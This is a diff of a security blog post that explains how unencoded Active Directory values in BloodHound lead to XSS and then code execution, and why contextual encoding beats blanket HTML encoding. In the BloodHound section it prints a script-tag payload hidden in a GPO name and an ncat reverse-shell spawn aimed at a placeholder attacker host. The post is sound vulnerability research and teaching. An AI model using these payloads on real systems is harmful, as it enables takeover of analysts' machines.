@@ -66,17 +66,17 @@ Here we see the empty string `infoTabContent` is replaced with a JavaScript obje
 
 ```javascript
 } else if (edge.label === 'SQLAdmin'){
-    formatted = `The user ${sourceName} is a SQL admin on the computer ${targetName}.
+  formatted = `The user ${sourceName} is a SQL admin on the computer ${targetName}.
 
-    There is at least one MSSQL instance running on ${targetName} where the user ${sourceName} is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service (the primary database engine for SQL Server) have sysadmin privileges in the SQL Server application. As a result, the SQL Server service account can be used to log into the SQL Server instance remotely, read all of the databases (including those protected with transparent encryption), and run operating systems command through SQL Server (as the service account) using a variety of techniques.
+  There is at least one MSSQL instance running on ${targetName} where the user ${sourceName} is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service (the primary database engine for SQL Server) have sysadmin privileges in the SQL Server application. As a result, the SQL Server service account can be used to log into the SQL Server instance remotely, read all of the databases (including those protected with transparent encryption), and run operating systems command through SQL Server (as the service account) using a variety of techniques.
 
-    For Windows systems that have been joined to an Active Directory domain, the SQL Server instances and the associated service account can be identified by executing a LDAP query for a list of "MSSQLSvc" Service Principal Names (SPN) as a domain user. In short, when the Database Engine service starts, it attempts to register the SPN, and the SPN is then used to help facilitate Kerberos authentication.
-    
-    Author: Scott Sutherland`;
+  For Windows systems that have been joined to an Active Directory domain, the SQL Server instances and the associated service account can be identified by executing a LDAP query for a list of "MSSQLSvc" Service Principal Names (SPN) as a domain user. In short, when the Database Engine service starts, it attempts to register the SPN, and the SPN is then used to help facilitate Kerberos authentication.
+  
+  Author: Scott Sutherland`;
 }
 ```
 
-Based on my usage and understanding of the tool, and as the help dialog helpfully points out, these values are based on data collected by the ingestor script from Active Directory i.e. from an 'untrusted' source, and therefor "attacker" controlled (note the ironic inversion of 'attacker' in this context). This confirms the exploitability of our canidate point, attacker controlled content is indeed passed to `dangerouslySetInnerHTML`. All an attacker needs to do is plant malicous values, such as a GPO as Fab demonstrated with the following name:
+Based on my usage and understanding of the tool, and as the help dialog helpfully points out, these values are based on data collected by the ingestor script from Active Directory i.e. from an 'untrusted' source, and therefor "attacker" controlled (note the ironic inversion of 'attacker' in this context). This confirms the exploitability of our canidate point, attacker controlled content is indeed passed to `dangerouslySetInnerHTML`. All an attacker needs to do is plant malicous values, such as a GPO as Fab demonstrated, with the following name:
 
 ```html
 aaaaaa<SCRIPT SRC="http://example.com/poc.js">
@@ -91,14 +91,69 @@ spawn('ncat', ['-e', '/bin/bash', '<attacker host>', '<some port>']);
 
 Since the GPO name is not properly encoded it will be rendered by the DOM as HTML, and Electron will parse the `<SCRIPT` tag and dutifully retrieve and execute the context of `poc.js`. As discussed before, since the NodeJS APIs are enabled this attacker controlled JavaScript can simply spawn a bash child process and execute arbitrary native code on the machine.
 
-A reasonable scenario here would be blue teams hiding malicous values in their AD deployment waiting for the red team to run Bloodhoud, and subsequently exploit the red team operator's machine. Though blue teams often also run this tool, so were a red team operator in a position to influence the data collected by Bloodhound but otherwise had limited access to AD the exploit could go in the traditional direction too.
+A reasonable scenario here would be blue teams hiding malicous values in their AD deployment waiting for the red team to run Bloodhoud, and subsequently exploit the red team operator's machine. Though blue teams often also run this tool, so were a red team operator in a position to influence the data collected by Bloodhound, but otherwise had limited access to AD the exploit could go in the traditional direction too.
 
+#### HTML Encoding
+
+The most comprehensive fix for this vulnerability would be to re-write the functionality such that `dangerouslySetInnerHTML` is not needed, however from a practical perspective a lot of code would need to be refactored. A short term and effective fix is to HTML encode the attacker controlled variables. By HTML encoding these values, we can ensure these strings are never interpreted by the browser as actual HTML, and can support arbitrary characters. The prior payload `aaaaaa<SCRIPT SRC="http://example.com/poc.js">` will simply be displayed as `aaaaaa<SCRIPT SRC="http://example.com/poc.js">`. So is preventing cross-site scripting a simple matter of HTML encoding attacker controlled values? Unfortunately no.
+
+In another area of the application the [Mustache](https://mustache.github.io/) template library is used to render tool tips. The Mustache library HTML encodes by default, another potential fix for the prior vulnerability would be to switch from string interpolation to Mustache templates. However, as we discussed the proper fix is _contextual encoding_, not blanket HTML encoding. HTML encoding will prevent XSS in an HTML context, but when used outside of an HTML context it will fail, or only coincidentally prevent XSS. 
+
+Looking at the usage of Mustache in Bloodhound we see that a few values are passed to the tooltips, notably `label` is attacker controlled:
+
+#### [`nodeTooltip.html`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/nodeTooltip.html)
+```html
+<div class="header">
+  {{label}}
+</div>
+<ul class="tooltip-ul">
+  {{#type_ou}}
+  <li onclick="emitter.emit('setStart', '{{type}}:{{guid}}')">
+    <i class="fa fa-map-marker-alt"></i> Set as Starting Node
+  </li>
+  <li onclick="emitter.emit('setEnd', '{{type}}:{{guid}}')">
+    <i class="fa fa-bullseye"> </i> Set as Ending Node
+  </li>
+  {{/type_ou}}
+  {{^type_ou}}
+  <li onclick="emitter.emit('setStart', '{{type}}:{{label}}')">
+    <i class="fa fa-map-marker-alt"></i> Set as Starting Node
+  </li>
+```
+
+In the first usage, `{{label}}` is not vulnerable, since this is an HTML context i.e. the string we are rendering is within an HTML tag:
+
+```html
+<div class="header">
+    {{label}}
+</div>
+```
+
+The second instance of `{{label}}` though is used as part of an `onclick=` event, which is a JavaScript event triggered when a user clicks on the HTML tag. Therefore for the contents of `onclick=` will be parsed as JavaScript code:
+
+```html
+<li onclick="emitter.emit('setStart', '{{type}}:{{label}}')">
+  <i class="fa fa-map-marker-alt"></i> Set as Starting Node
+</li>
+```
+
+Note that `{{label}}` is rendered into the following JavaScript code snippet:
+
+```javascript
+emitter.emit('setStart', '{{type}}:{{label}}')
+```
+
+While Mustache will HTML encode the `label` variable, we're not rendering this variable in an HTML context since this will be interpreted by the browser as JavaScript. 
+
+This is also why sanitizing user input can be a problematic fix for injection issues, it's rare that at the time of accepting user input we know exactly what context(s) the values will be used in later. For example, if we sanitized `label` for XSS by removing HTML control characters such as `<` and `>` we'd still be left with an exploitable XSS vulnerability. If we go further and remove `'`, `"`, `}`, and `)` are we certain there's not a third or even forth context where `label` is used that may be vulnerable? This also touches on why you should always use whitelist sanitization, not a blacklist as a whitelist will better account for unintended side effects. Furthermore, if these characters are valid in a GPO name and we reject GPO names that these characters we'll have a functionality issue in that we cannot properly display the name as intended. This is why proper encoding must be used to meet both our functional and security requirements.
 
 ### Signal
 
 In 2018 [Iván Ariel Barrera Oro](https://twitter.com/HacKanCuBa), [Alfredo Ortega](https://twitter.com/ortegaalfredo), [Juliano Rizzo](https://twitter.com/julianor), and [Matt Bryant](https://twitter.com/IAmMandatory) found [multiple remote code execution flaws](https://thehackerblog.com/i-too-like-to-live-dangerously-accidentally-finding-rce-in-signal-desktop-via-html-injection-in-quoted-replies/) in Signal, a secure end-to-end encrypted messaging application.
 
 Notably, these exploits bypassed the applicaiton's [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
+
+
 
 ### What's in a Name?
 
